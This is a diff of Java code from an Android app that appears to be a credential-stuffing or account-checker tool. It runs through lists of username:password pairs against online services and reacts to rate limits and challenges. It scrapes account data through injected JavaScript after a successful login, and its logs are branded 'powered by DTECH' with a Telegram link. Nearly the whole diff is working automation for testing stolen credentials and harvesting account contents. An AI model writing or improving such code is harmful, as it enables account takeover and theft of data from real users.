-                 verificationRunnable = () -> checkVerificationStatus(targetIndex);
-                 batchHandler.postDelayed(verificationRunnable, 2000);
-             }
-         });
+                     if ("success".equals(status)) {
+                         String extracted = "";
+                         if (res.has("extractedData")) {
+                             JSONObject ext = res.getJSONObject("extractedData");
+                             StringBuilder sb = new StringBuilder();
+                             java.util.Iterator<String> keys = ext.keys();
+                             while(keys.hasNext()) {
+                                 String key = keys.next();
+                                 sb.append(" | ").append(key).append(": ").append(ext.getString(key));
+                             }
+                             extracted = sb.toString();
+                         }
+                         performBatchExtraction(targetIndex, extracted, 0, false);
+
+                     } else if ("failure".equals(status)) {
+                         logResult(false, res.optString("detail"), targetIndex);
+                         moveToNext(targetIndex);
+                     } else if ("rate_limit".equals(status)) {
+                         handleRateLimit();
+                     } else if ("challenge".equals(status)) {
+                         handleChallenge(targetIndex);
+                     } else {
+                         verificationRunnable = () -> checkVerificationStatus(targetIndex);
+                         batchHandler.postDelayed(verificationRunnable, 2000);
+                     }
+                 } catch (JSONException e) {
+                     verificationRunnable = () -> checkVerificationStatus(targetIndex);
+                     batchHandler.postDelayed(verificationRunnable, 2000);
+                 }
+            } else {
+                verificationRunnable = () -> checkVerificationStatus(targetIndex);
+                batchHandler.postDelayed(verificationRunnable, 2000);
+            }
+        });
     }
 
     private void performBatchExtraction(int targetIndex, String currentExtracted, int pointIndex, boolean hasRedirected) {
@@ -2178,25 +1842,36 @@ private void setupWebView() {
                  performBatchExtraction(targetIndex, newExtracted, pointIndex + 1, hasRedirected);
              });
         } else {
-             // Fallback if marked as DOM but we want it native visual now.
-             // Best effort OCR if no valid rect was set.
-             performOcr(0, 0, 1, 1, text -> {
-                 String label = p.getLabel();
-                 String cleanText = text.replace("\n", " ").trim();
+            // DOM Extraction
+            String js = "javascript:(function() { " +
+                        "  var el = document.querySelector('" + p.getSelector().replace("'", "\\'") + "'); " +
+                        "  return el ? el.innerText : ''; " +
+                        "})();";
+            mWebView.evaluateJavascript(js, value -> {
+                 String text = "";
+                 if (value != null && !value.equals("null")) {
+                     text = value;
+                     if (text.startsWith("\"") && text.endsWith("\"") && text.length() > 1) {
+                         text = text.substring(1, text.length() - 1);
+                     }
+                 }
 
+                 // Apply pattern matching if necessary
                  if (p.getPattern() != null && !p.getPattern().isEmpty()) {
                      try {
                          java.util.regex.Pattern regex = java.util.regex.Pattern.compile(p.getPattern());
-                         java.util.regex.Matcher matcher = regex.matcher(cleanText);
+                         java.util.regex.Matcher matcher = regex.matcher(text);
                          if (matcher.find()) {
-                             cleanText = matcher.group();
+                             text = matcher.group();
                          }
                      } catch(Exception e) {}
                  }
 
+                 String cleanText = text.replace("\n", " ").trim();
+                 String label = p.getLabel();
                  String newExtracted = currentExtracted + " | " + label + ": " + cleanText;
                  performBatchExtraction(targetIndex, newExtracted, pointIndex + 1, hasRedirected);
-             });
+            });
         }
     }
 
@@ -2262,11 +1937,8 @@ private void setupWebView() {
         if (success) batchSuccessCount++; else batchFailureCount++;
 
         String serviceName = currentService != null ? currentService.getName() : "Unknown";
-        String extra = (detail != null && !detail.isEmpty()) ? detail : "";
-        if (!extra.isEmpty() && !extra.startsWith(" | ")) {
-            extra = " | " + extra;
-        }
-        String msg = status + " | " + serviceName + " | " + cred + extra + " (powered by DTECH https://t.me/DTECHX24)";
+        String extra = detail != null ? detail : "";
+        String msg = status + "|" + serviceName + "|" + cred + extra + " (powered by DTECH https://t.me/DTECHX24)";
 
         Log.i(TAG, "Batch Result: " + msg);
         updateTerminal(status + ": " + cred.split(":")[0]);
@@ -2275,8 +1947,24 @@ private void setupWebView() {
         if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
 
         if (index == 0 && !useCoordinateMode) {
-             // Auto-verify: Immediately trigger success (next)
-             moveToNext(index);
+             if (currentService.getName().toLowerCase().contains("(imported)")) {
+                 // Auto-verify: Immediately trigger success (next)
+                 moveToNext(index);
+                 return;
+             }
+             runOnUiThread(() -> {
+                 new AlertDialog.Builder(this)
+                     .setTitle("Did the automation work?")
+                     .setMessage("Confirm typing/clicking worked?")
+                     .setPositiveButton("Yes", (d, w) -> moveToNext(index))
+                     .setNegativeButton("No, Try Coordinates", (d, w) -> {
+                         useCoordinateMode = true;
+                         currentCredentialIndex = 0;
+                         processNextCredential();
+                     })
+                     .setCancelable(false)
+                     .show();
+             });
              return;
         }
     }
